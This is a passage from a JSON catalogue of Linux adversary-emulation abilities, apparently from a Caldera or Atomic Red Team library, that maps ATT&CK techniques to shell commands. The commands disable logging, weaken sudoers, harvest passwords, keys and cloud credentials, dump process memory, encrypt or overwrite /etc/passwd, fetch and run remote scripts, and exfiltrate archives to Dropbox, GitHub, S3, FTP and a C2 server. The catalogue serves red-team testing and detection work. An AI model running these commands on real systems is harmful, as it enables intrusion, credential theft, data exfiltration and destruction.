"tactic": "defense-evasion", "technique": "Impair Defenses", "platform": "linux", "requirements": [], "command": "sudo systemctl stop systemd-journald", "unlocks": []}, {"id": "3a68db58e75f8887944e846f0455f758", "ability_name": "Disable syslog", "description": "Disables syslog collection\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify Tools", "platform": "linux", "requirements": ["root"], "command": "if (rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed) > /dev/null; then : ; else sudo sh -c 'command -v yum > /dev/null && yum -y install epel-release rsyslog || command -v apt-get > /dev/null && apt-get install -y rsyslog'; fi; systemctl stop rsyslog; systemctl disable rsyslog\n", "unlocks": ["no.logs"]}, {"id": "adaa45fb1e639a778fbac7cba1278bcb", "ability_name": "Disable tty_tickets for sudo caching", "description": "Sets sudo caching tty_tickets value to disabled. This is dangerous to modify without using 'visudo', do not do this on a production system.\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Sudo and Sudo Caching", "platform": "linux", "requirements": [], "command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\"; sudo visudo -c -f /etc/sudoers", "unlocks": []}, {"id": "ce485320-41a4-42e8-a510-f5a8fe96a644", "ability_name": "Discover Mail Server", "description": "Identify the organizations mail server", "tactic": "discovery", "technique": "Remote System Discovery", "platform": "linux", "requirements": [], "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "unlocks": ["target.org.emailhost"]}, {"id": "6654bd2e9450280229dcfd92026252e8", "ability_name": "Discover Private SSH Keys", "description": "Discover private SSH keys on a macOS or Linux system.\n", "tactic": "credential-access", "technique": "Unsecured Credentials: Private Keys", "platform": "linux", "requirements": [], "command": "find / -name id_rsa 2>/dev/null >> /tmp/keyfile_locations.txt", "unlocks": []}, {"id": "c094dbd7b13ef134c59b6c211c4bb5ba", "ability_name": "Discover System Language by Environment Variable Query", "description": "Identify System language by checking the environment variables\n\nUpon successful execution, the 5 character locale result can be looked up to\ncorrelate the language and territory. Environment query commands are likely\nto run with a pattern match command e.g. `env | grep LANG`\n\nNote: `env` and `printenv` will usually provide the same results. `set` is\nalso used as a builtin command that does not generate syscall telemetry but\ndoes provide a list of the environment variables.\n", "tactic": "discovery", "technique": "System Location Discovery: System Language Discovery", "platform": "linux", "requirements": [], "command": "env | grep LANG; printenv LANG; set | grep LANG", "unlocks": []}, {"id": "40e77f5ee2d3d426ec1a7eb624df6f2f", "ability_name": "Discover System Language by locale file", "description": "Identify System language with the by reading the locale configuration file.\n\nThe locale configuration file contains the `LANG` environment variable which\nwill contain the 5 character locale that can be looked up to correlate the\nlanguage and territory.\n", "tactic": "discovery", "technique": "System Location Discovery: System Language Discovery", "platform": "linux", "requirements": [], "command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale", "unlocks": []}, {"id": "0475abc9998e42d07d67958f96697eec", "ability_name": "Discover System Language with locale", "description": "Identify System language with the `locale` command.\n\nUpon successful execution, the output will contain the environment variables that indicate\nthe 5 character locale that can be looked up to correlate the language and territory.\n", "tactic": "discovery", "technique": "System Location Discovery: System Language Discovery", "platform": "linux", "requirements": [], "command": "locale", "unlocks": []}, {"id": "1d87f5f8838a166e5035179c33e3d615", "ability_name": "Discover System Language with localectl", "description": "Identify System language with the `localectl` command.\n\nUpon successful execution, the key `System Locale` from the output will contain the\n`LANG` environment variable that has the 5 character locale result that can be looked\nup to correlate the language and territory.\n", "tactic": "discovery", "technique": "System Location Discovery: System Language Discovery", "platform": "linux", "requirements": [], "command": "localectl status", "unlocks": []}, {"id": "2fe2d5e6-7b06-4fc0-bf71-6966a1226731", "ability_name": "Disrupt WIFI", "description": "Turn a computers WIFI off", "tactic": "impact", "technique": "Endpoint Denial of Service", "platform": "linux", "requirements": ["wifi.network.ssid"], "command": "./wifi.sh off", "unlocks": []}, {"id": "3e78d2e02cf72b0ed83ba4849ff1f32e", "ability_name": "Do reconnaissance for files that have the setgid bit set", "description": "This test simulates a command that can be run to enumerate files that have the setgid bit set\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Setuid and Setgid", "platform": "linux", "requirements": [], "command": "find /usr/bin -perm -2000", "unlocks": []}, {"id": "3e1dbbddf490e1869a130a07cb254e5f", "ability_name": "Do reconnaissance for files that have the setuid bit set", "description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n", "tactic": "multiple", "technique": "Abuse Elevation Control Mechanism: Setuid and Setgid", "platform": "linux", "requirements": [], "command": "find /usr/bin -perm -4000", "unlocks": ["setuid.info"]}, {"id": "422526ec-27e9-429a-995b-c686a29561a4", "ability_name": "Dump history", "description": "Get contents of bash history", "tactic": "credential-access", "technique": "Unsecured Credentials: Bash History", "platform": "linux", "requirements": [], "command": "cat ~/.bash_history", "unlocks": ["remote.ssh.cmd"]}, {"id": "3a27f7828503c255275fa014464fb815", "ability_name": "Dump individual process memory with Python (Local)", "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\n", "tactic": "credential-access", "technique": "OS Credential Dumping: Proc Filesystem", "platform": "linux", "requirements": [], "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); PYTHON=$(which python || which python3 || which python2); $PYTHON 05c7d6_dump_heap.py $PID /tmp/T1003.007.bin; grep -i \"PASS\" \"/tmp/T1003.007.bin\"", "unlocks": []}, {"id": "2966a5fc825f509f4adff7b855e26574", "ability_name": "Dump individual process memory with sh (Local)", "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n", "tactic": "credential-access", "technique": "OS Credential Dumping: Proc Filesystem", "platform": "linux", "requirements": [], "command": "sh /tmp/T1003.007.sh; PID=$(pgrep -n -f \"T1003.007\"); HEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1); MEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1)))); MEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2)))); MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START))); dd if=/proc/\"${PID}\"/mem of=\"/tmp/T1003.007.bin\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"; grep -i \"PASS\" \"/tmp/T1003.007.bin\"", "unlocks": []}, {"id": "f97de07a3b9e3b132f7bc42680151d81", "ability_name": "Edit UFW firewall main configuration file", "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": [], "command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw; grep \"# THIS IS A COMMENT\" /etc/default/ufw", "unlocks": []}, {"id": "683115a2ceeb045e6ffbf4487322b220", "ability_name": "Edit UFW firewall sysctl.conf file", "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": [], "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf", "unlocks": []}, {"id": "8a60db80ab6f4a6b1db758c95bacfafa", "ability_name": "Edit UFW firewall ufw.conf file", "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": [], "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf", "unlocks": []}, {"id": "a1e9351c7799d884d29a5e61712ab58e", "ability_name": "Edit UFW firewall user.rules file", "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n", "tactic": "defense-evasion", "technique": "Impair Defenses: Disable or Modify System Firewall", "platform": "linux", "requirements": [], "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules; grep \"# THIS IS A COMMENT\" /etc/ufw/user.rules", "unlocks": []}, {"id": "0672185d22612c95792d39efab04ba17", "ability_name": "Encrypt files using 7z (Linux)", "description": "Uses 7z to encrypt a file\n", "tactic": "impact", "technique": "Data Encrypted for Impact", "platform": "linux", "requirements": ["exfil.done"], "command": "$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd", "unlocks": ["encrypt.file"]}, {"id": "752f0b88233950aee6c1c249e89ee941", "ability_name": "Encrypt files using ccrypt (Linux)", "description": "Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n", "tactic": "impact", "technique": "Data Encrypted for Impact", "platform": "linux", "requirements": [], "command": "if [[ $USER == \"root\" ]]; then $which_ccencrypt /etc/passwd; file /etc/passwd.cpt; sudo su; else $which_ccencrypt ~/.bash_history; file ~/.bash_history.cpt; sudo su; fi", "unlocks": []}, {"id": "a3035e1a84301ca2ab38a7d966cce6b7", "ability_name": "Encrypt files using gpg (Linux)", "description": "Uses gpg to encrypt a file\n", "tactic": "impact", "technique": "Data Encrypted for Impact", "platform": "linux", "requirements": ["exfil.done"], "command": "echo \"passwd\" | $which gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd", "unlocks": ["encrypt.file"]}, {"id": "be4801446e4452c2a3e53dbe57c7a365", "ability_name": "Encrypt files using openssl (Linux)", "description": "Uses openssl to encrypt passwd file and change its content", "tactic": "impact", "technique": "Data Encrypted for Impact", "platform": "linux", "requirements": ["exfil.done"], "command": "$which openssl genrsa -out /tmp/key.pem 2048; $which openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem; $which openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip", "unlocks": ["encrypt.file"]}, {"id": "6e7e92c6-a8bc-47f7-8bb6-c55d967f652f", "ability_name": "Encrypt system", "description": "Encrypt /etc/passwd or /etc/shadow", "tactic": "impact", "technique": "Data Encrypted for Impact", "platform": "linux", "requirements": ["encrypt.file"], "command": "echo \"hola\" > /etc/passwd", "unlocks": []}, {"id": "8acfd16975bca1d9a7d03473196f38b5", "ability_name": "Enumerate all accounts (Local)", "description": "Enumerate all accounts by copying /etc/passwd to another file\n", "tactic": "discovery", "technique": "Account Discovery: Local Account", "platform": "linux", "requirements": [], "command": "cat /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt", "unlocks": []}, {"id": "26d3702887944abcc64b406baf8f8e43", "ability_name": "Enumerate users and groups", "description": "Utilize groups and id to enumerate users and groups\n", "tactic": "discovery", "technique": "Account Discovery: Local Account", "platform": "linux", "requirements": [], "command": "groups; id", "unlocks": []}, {"id": "dbe8b7090136539f0b6dea3c802024f5", "ability_name": "Environment variable scripts", "description": "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "export ART='echo \"Atomic Red Team was here... T1059.004\"'; echo $ART |/bin/bash", "unlocks": []}, {"id": "278255b5ed85eebe3eab6c0a3d3d135b", "ability_name": "Environment variables discovery on macos and linux", "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n", "tactic": "discovery", "technique": "System Information Discovery", "platform": "linux", "requirements": [], "command": "env", "unlocks": []}, {"id": "fc5dd23fbe8b66fdfc6501a601ba9b86", "ability_name": "Examine password complexity policy - CentOS/RHEL 6.x", "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n", "tactic": "discovery", "technique": "Password Policy Discovery", "platform": "linux", "requirements": [], "command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then : ; else echo Please run from CentOS or RHEL v6; fi;  ;  cat /etc/pam.d/system-auth; cat /etc/security/pwquality.conf", "unlocks": []}, {"id": "a700a94fea368d729fc80dee172fb09a", "ability_name": "Examine password complexity policy - CentOS/RHEL 7.x", "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n", "tactic": "discovery", "technique": "Password Policy Discovery", "platform": "linux", "requirements": [], "command": "if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then : ; else echo Please run from CentOS or RHEL v7; fi;  ;  cat /etc/security/pwquality.conf", "unlocks": []}, {"id": "5fdbb087d71613a73117423ef56c68ab", "ability_name": "Examine password complexity policy - Ubuntu", "description": "Lists the password complexity policy to console on Ubuntu Linux.\n", "tactic": "discovery", "technique": "Password Policy Discovery", "platform": "linux", "requirements": [], "command": "cat /etc/pam.d/common-password", "unlocks": []}, {"id": "b1ddc060c050bb98d81abf4070818a10", "ability_name": "Examine password expiration policy - All Linux", "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n", "tactic": "discovery", "technique": "Password Policy Discovery", "platform": "linux", "requirements": [], "command": "cat /etc/login.defs", "unlocks": []}, {"id": "b3ea15867906316fd87a4f320a9403d3", "ability_name": "Execute Python via Python executables (Linux)", "description": "Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments\n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Python", "platform": "linux", "requirements": [], "command": "which_python=$(which python || which python3 || which python2); echo 'import requests' >; echo 'import os' >>; echo 'url = \"#{script_url}\"' >>; echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >>; echo 'session = requests.session()' >>; echo 'source = session.get(url).content' >>; echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >>; echo 'fd.write(source)' >>; echo 'fd.close()' >>; echo 'os.system(malicious_command)' >>; $which_python -c 'import py_compile; py_compile.compile(\"#{python_script_name}\", \"#{python_binary_name}\")'; $which_python", "unlocks": []}, {"id": "85758c8aa8c05f1b82e74e02ca26a97a", "ability_name": "Execute Python via scripts (Linux)", "description": "Create Python file (.py) that downloads and executes shell script via executor arguments", "tactic": "execution", "technique": "Command and Scripting Interpreter: Python", "platform": "linux", "requirements": [], "command": "which_python=$(which python || which python3 || which python2); echo 'import requests' >; echo 'import os' >>; echo 'url = \"#{script_url}\"' >>; echo 'malicious_command = \"#{executor} #{payload_file_name} #{script_args}\"' >>; echo 'session = requests.session()' >>; echo 'source = session.get(url).content' >>; echo 'fd = open(\"#{payload_file_name}\", \"wb+\")' >>; echo 'fd.write(source)' >>; echo 'fd.close()' >>; echo 'os.system(malicious_command)' >>; $which_python", "unlocks": []}, {"id": "23dafb943f2f1a3e21e8204826c7b271", "ability_name": "Execute a process from a directory masquerading as the current parent directory.", "description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n", "tactic": "defense-evasion", "technique": "Masquerading: Match Legitimate Name or Location", "platform": "linux", "requirements": [], "command": "mkdir $HOME/...; cp $(which sh) $HOME/...; $HOME/.../sh -c \"echo Hello from the Atomic Red Team test T1036.005#1\"", "unlocks": []}, {"id": "5e85bef7dcda5706a9948bea69e09ade", "ability_name": "Execute shell script via python's command mode arguement", "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)", "tactic": "execution", "technique": "Command and Scripting Interpreter: Python", "platform": "linux", "requirements": [], "command": "which_python=$(which python || which python3 || which python2); $which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'", "unlocks": []}, {"id": "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "ability_name": "Exfil Compressed Archive to Dropbox", "description": "This will exfiltrate an archive to Dropbox.", "tactic": "exfiltration", "technique": "Exfiltration to Cloud Storage", "platform": "linux", "requirements": ["host.dir.compress"], "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -X POST https://content.dropboxapi.com/2/files/upload\n    --header \"Authorization: Bearer #{dropbox.api.key}\"\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/#{dropbox.target.dir}/$RemoteName\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false,\\\"strict_conflict\\\": false}\"\n    --header \"Content-Type: application/octet-stream\"\n    --data-binary @#{host.dir.compress}", "unlocks": ["exfil.done"]}, {"id": "d754878c-17dd-46dc-891c-a993f8a10336", "ability_name": "Exfil Compressed Archive to FTP Server", "description": "This ability exfiltrates a compressed archive to an FTP server.", "tactic": "exfiltration", "technique": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol", "platform": "linux", "requirements": ["host.dir.compress"], "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -T #{host.dir.compress} ftp://#{ftp.server.address}/$RemoteName --user #{ftp.user.name}:'#{ftp.user.password}'", "unlocks": ["exfil.done"]}, {"id": "0582dc26-e0cf-4645-88cf-f37a02279976", "ability_name": "Exfil Compressed Archive to Github Gist", "description": "This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save\nthe base64 string from the Gist and run ----\n(Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----\n(Linux) cat b64.txt | base64 -d > archive.extension\n", "tactic": "exfiltration", "technique": "Exfiltration to Code Repository", "platform": "linux", "requirements": ["host.dir.compress"], "command": "GHUser=\"#{github.user.name}\";\nGHPAT=\"#{github.access.token}\";\nFileContent=$(base64 #{host.dir.compress});\nLocalFile='#{host.dir.compress}';\nRemoteFile=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ntmp_file=$(mktemp);\necho \"{\\\"public\\\": false,\\\"files\\\": {\\\"$RemoteFile\\\": {\\\"content\\\": \\\"${FileContent}\\\"}}}\" > $tmp_file;\ncurl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;\nrm $tmp_file", "unlocks": ["exfil.done"]}, {"id": "4a1120a5-971c-457f-bb07-60641b4723fd", "ability_name": "Exfil Compressed Archive to Github Repository", "description": "This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.", "tactic": "exfiltration", "technique": "Exfiltration to Code Repository", "platform": "linux", "requirements": ["host.dir.compress"], "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;", "unlocks": ["exfil.done"]}, {"id": "e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "ability_name": "Exfil Compressed Archive to S3 via AWS CLI", "description": "Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n", "tactic": "exfiltration", "technique": "Exfiltration to Cloud Storage", "platform": "linux", "requirements": ["host.dir.compress"], "command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"exfil-#{paw}-$(basename $LocalFile)\";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;", "unlocks": ["exfil.done"]}, {"id": "dd4d3d6f-be0a-4d80-ada2-0b7f3228d2dc", "ability_name": "Exfil Compressed Archive to S3 via Golang", "description": "Use the AWS SDK for GoLang to upload the compressed archive to the provided S3 bucket.\nIt is assumed that the current user credentials have the proper permissions to write to the target S3 bucket.\nRequires the agent to be compiled with the native_aws extension.\nTimeout set to 45 seconds.\n", "tactic": "exfiltration", "technique": "Exfiltration to Cloud Storage", "platform": "linux", "requirements": ["host.dir.compress"], "command": "s3upload \"#{host.dir.compress}\" \"#{s3.source.region}\" \"#{s3.source.name}\" \"aws-#{paw}-compressed\" 45s", "unlocks": ["exfil.done"]}, {"id": "a201bec2-a193-4b58-bf0e-57fa621da474", "ability_name": "Exfil Directory Files to GitHub", "description": "This ability will exfiltrate all files in a set staged directory to a repository in GitHub.\n", "tactic": "exfiltration", "technique": "Exfiltration to Code Repository", "platform": "linux", "requirements": ["host.dir.staged"], "command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalDirectory=#{host.dir.staged};\nHeader=\"Authorization: token $GHPAT\";\n\nfor file in $LocalDirectory/*.*; do\n  TempName=$(echo $file | sed \"s/ /-/g\")\n\tRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename \"$TempName\")\";\n\techo \"{\\\"message\\\":\\\"Committed $(basename $TempName) at: $(date)\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\n  base64 -w 0 \"$file\" >>/tmp/b64;\n  echo \"\\\"}\" >>/tmp/b64;\n\tcontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\n  rm /tmp/b64;\ndone;", "unlocks": []}, {"id": "ea713bc4-63f0-491c-9a6f-0b01d560b87e", "ability_name": "Exfil staged directory", "description": "Exfil the staged directory", "tactic": "exfiltration", "technique": "Exfiltration Over C2 Channel", "platform": "linux", "requirements": ["host.dir.compress"], "command": "curl -F \"data=@#{host.dir.compress}\" --header \"X-Request-ID: `hostname`-#{paw}\" #{server}/file/upload", "unlocks": ["exfil.done"]}, {"id": "1ecd8f81d020145064af72dbcd47110a", "ability_name": "Exfiltrate data HTTPS using curl linux", "description": "Exfiltrate data HTTPS using curl to file share site file.io\n", "tactic": "exfiltration", "technique": "Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol", "platform": "linux", "requirements": [], "command": "curl -F 'file=@3945c9_artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/", "unlocks": []}, {"id": "7db784562afbea0265fcafc4243b66de", "ability_name": "Exfiltration Over Alternative Protocol - SSH", "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n", "tactic": "exfiltration", "technique": "Exfiltration Over Alternative Protocol", "platform": "linux", "requirements": [], "command": "tar czpf - /Users/* | openssl des3 -salt -pass atomic | ssh atomic@target.example.com 'cat > /Users.tar.gz.enc'", "unlocks": []}, {"id": "5ac7f6ec1898d8d408f9cdc687262cc7", "ability_name": "Exfiltration Over Alternative Protocol - SSH", "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n", "tactic": "exfiltration", "technique": "Exfiltration Over Alternative Protocol", "platform": "linux", "requirements": [], "command": "ssh target.example.com \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz", "unlocks": []}, {"id": "37479c168bb93ed053c5c4843ac01729", "ability_name": "Extract passwords with grep", "description": "Extracting credentials from files\n", "tactic": "credential-access", "technique": "Unsecured Credentials: Credentials In Files", "platform": "linux", "requirements": [], "command": "grep -ri password / > /tmp/passwords.txt ; echo \"/tmp/passwords.txt\" ", "unlocks": ["info.created"]}, {"id": "55f9600a-756f-496b-b27f-682052dc429c", "ability_name": "File Hunter Mission", "description": "Hunts for files of a certain extension and inserts a message", "tactic": "impact", "technique": "Data Manipulation: Stored Data Manipulation", "platform": "linux", "requirements": [], "command": "./mission.go -duration 60 -extension .caldera -dir '/'", "unlocks": []}, {"id": "12b56ab7e1f7739b1a60f6d8098a7ce7", "ability_name": "Find AWS credentials", "description": "Find local AWS credentials from file, defaults to using / as the look path.\n", "tactic": "credential-access", "technique": "Unsecured Credentials: Credentials In Files", "platform": "linux", "requirements": [], "command": "find / -name \"credentials\" -type f -path \"*/.aws/*\" 2>/dev/null", "unlocks": []}, {"id": "720a3356-eee1-4015-9135-0fc08f7eb2d5", "ability_name": "Find Git Repositories", "description": "This ability will locate directories that are cloned Git repositories.", "tactic": "collection", "technique": "Data from Local System", "platform": "linux", "requirements": [], "command": "for directoryname in $(find /home/ -name '.git' -type d 2>/dev/null | head -5); do\n\tprintf \"$(dirname \"$directoryname\")\\n\";\ndone;", "unlocks": ["host.dir.git"]}, {"id": "638fb6bb-ba39-4285-93d1-7e4775b033a8", "ability_name": "Find System Network Connections", "description": "Find System Network Connections", "tactic": "discovery", "technique": "System Network Connections Discovery", "platform": "linux", "requirements": [], "command": "netstat -anto", "unlocks": []}, {"id": "c3a2cfa1e1d09d61d00b86bc5e09986f", "ability_name": "Find and Access Github Credentials", "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n", "tactic": "credential-access", "technique": "Unsecured Credentials: Credentials In Files", "platform": "linux", "requirements": [], "command": "for file in $(find / -name .netrc 2> /dev/null);do echo $file ; cat $file ; done", "unlocks": []}, {"id": "30732a56-4a23-4307-9544-09caf2ed29d5", "ability_name": "Find deletable dirs (per user)", "description": "Discover all directories containing deletable files by user", "tactic": "discovery", "technique": "System Information Discovery", "platform": "linux", "requirements": ["host.user.name"], "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;", "unlocks": []}, {"id": "90c2efaa-8205-480d-8bb6-61d90dbaf81b", "ability_name": "Find files", "description": "Locate files deemed sensitive", "tactic": "collection", "technique": "Data from Local System", "platform": "linux", "requirements": [], "command": "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5", "unlocks": []}, {"id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48", "ability_name": "Find local users", "description": "Get a list of all local users", "tactic": "discovery", "technique": "Account Discovery: Local Account", "platform": "linux", "requirements": [], "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'", "unlocks": ["host.user.name"]}, {"id": "de632c2d-a729-4b77-b781-6a6b09c148ba", "ability_name": "Find private keys", "description": "Find private keys on the file system", "tactic": "credential-access", "technique": "Unsecured Credentials: Private Keys", "platform": "linux", "requirements": [], "command": "for i in .key .pgp .gpg .ppk .p12 .pem .pfx .cer .p7b .asc .crt;do find /etc -maxdepth 3 -name \"*${i}\" 2>/dev/null;done;", "unlocks": []}, {"id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "ability_name": "Find user processes", "description": "Get process info for processes running as a user", "tactic": "discovery", "technique": "Process Discovery", "platform": "linux", "requirements": ["host.user.name"], "command": "ps aux | grep #{host.user.name}", "unlocks": []}, {"id": "3a2ce3d5-e9e2-4344-ae23-470432ff8687", "ability_name": "Fingerprint network services", "description": "Uses nmap to fingerprint services that were network accessible", "tactic": "discovery", "technique": "Network Service Scanning", "platform": "linux", "requirements": [], "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}", "unlocks": []}, {"id": "fa6e8607-e0b1-425d-8924-9b894da5a002", "ability_name": "Get System Time", "description": "get current system time (ISO 8601)", "tactic": "discovery", "technique": "System Time Discovery", "platform": "linux", "requirements": [], "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"", "unlocks": ["host.current.time"]}, {"id": "4cbe4aebe95c5729526b5d0325c4de0b", "ability_name": "Go compile", "description": "Compile a c file with either gcc or clang on Linux or Macos.\n", "tactic": "defense-evasion", "technique": "Obfuscated Files or Information: Compile After Delivery", "platform": "linux", "requirements": [], "command": "if [ -e  a932ec_T1027-004-test.go ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O a932ec_T1027-004-test.go; fi;  ;  go run a932ec_T1027-004-test.go", "unlocks": []}, {"id": "1aa4061e002213b7c1e0985f68d4e18c", "ability_name": "Harvest SUID executable files", "description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n", "tactic": "execution", "technique": "Command and Scripting Interpreter: Bash", "platform": "linux", "requirements": [], "command": "chmod +x PathToAtomicsFolder/T1059.004/src/AutoSUID.sh; bash PathToAtomicsFolder/T1059.004/src/AutoSUID.sh", "unlocks": []}, {"id": "6004a80b66c4c3e30595f178d91e2051", "ability_name": "Hex decoding with shell utilities", "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n", "tactic": "defense-evasion", "technique": "Deobfuscate/Decode Files or Information", "platform": "linux", "requirements": [], "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256); printf $ENCODED | xxd -r -p; echo $ENCODED | xxd -r -p; echo $(echo $ENCODED) | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded; echo $ENCODED > 